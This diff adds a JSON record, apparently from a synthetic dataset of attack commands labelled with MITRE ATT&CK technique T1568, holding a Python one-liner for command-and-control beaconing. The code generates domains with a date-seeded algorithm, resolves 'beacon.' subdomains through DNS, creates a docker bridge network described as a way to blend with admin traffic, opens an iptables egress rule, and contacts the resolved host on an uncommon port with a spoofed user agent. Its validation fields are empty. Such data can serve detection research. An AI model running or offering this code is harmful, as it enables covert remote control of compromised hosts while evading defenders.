@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='dock-key'; tlds=['net','com']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha1((base+str(i)).encode()).hexdigest()[:9]+'.'+tlds[i%len(tlds)] for i in range(n)]\n# Prepare a stealthy isolated bridge network (admin action) to blend traffic\ntry:\n    subprocess.run(['docker','network','create','--driver','bridge','--subnet','172.28.0.0/24','c2_br'],timeout=5)\nexcept Exception:\n    pass\nip=None; dom=None; port=random.choice([10443,25000,18088])\nfor d in dga(20):\n    resp=sr1(IP(dst='9.9.9.9')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='beacon.'+d,qtype='A')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; dom='beacon.'+d; break\n    if ip: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','-A','Mozilla/5.0',f'https://{dom}:{port}/probe','-k'])\n    print(dom,ip,port)\"",
+  "explanation": "Creates an isolated docker bridge to blend with admin activity, resolves a DGA subdomain, and opens a narrow egress path to a high, uncommon port for C2.",
+  "rationale_steps": [
+    "Establish a docker bridge network to hide within legitimate admin operations.",
+    "Generate DGA subdomains and resolve with scapy to obtain an A record.",
+    "Insert a restrictive iptables egress rule for the selected IP and port.",
+    "Perform a TLS probe on a nonstandard port to avoid signature-based detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-f15d3f92",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
